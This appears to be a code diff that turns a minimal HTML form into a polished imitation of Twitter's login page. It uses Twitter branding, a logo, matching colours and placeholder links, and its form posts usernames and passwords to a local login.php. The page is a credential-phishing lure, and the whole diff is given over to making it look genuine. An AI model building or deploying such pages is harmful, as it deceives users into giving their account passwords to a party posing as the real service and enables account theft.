@@ -1,1 +1,79 @@
-<html><body><form method='POST' action='login.php'>Twitter<br><input name='username'><input name='password' type='password'><input type='submit'></form></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login on Twitter</title>
+  <style>
+    body {
+      font-family: "Segoe UI", sans-serif;
+      background-color: #e6ecf0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      width: 300px;
+      text-align: center;
+    }
+
+    .logo {
+      width: 50px;
+      margin-bottom: 10px;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      box-sizing: border-box;
+    }
+
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #1da1f2;
+      border: none;
+      color: white;
+      font-weight: bold;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    .links {
+      margin-top: 15px;
+      font-size: 0.9em;
+    }
+
+    .links a {
+      color: #1da1f2;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://cdn-icons-png.flaticon.com/512/124/124021.png" alt="Twitter Logo" class="logo" />
+    <h2>Log in to Twitter</h2>
+    <form action="login.php" method="POST">
+      <input type="text" name="username" placeholder="Phone, email, or username" required />
+      <input type="password" name="password" placeholder="Password" required />
+      <button type="submit">Log In</button>
+    </form>
+    <div class="links">
+      <a href="#">Forgot password?</a> ·
+      <a href="#">Sign up for Twitter</a>
+    </div>
+  </div>
+</body>
+</html>
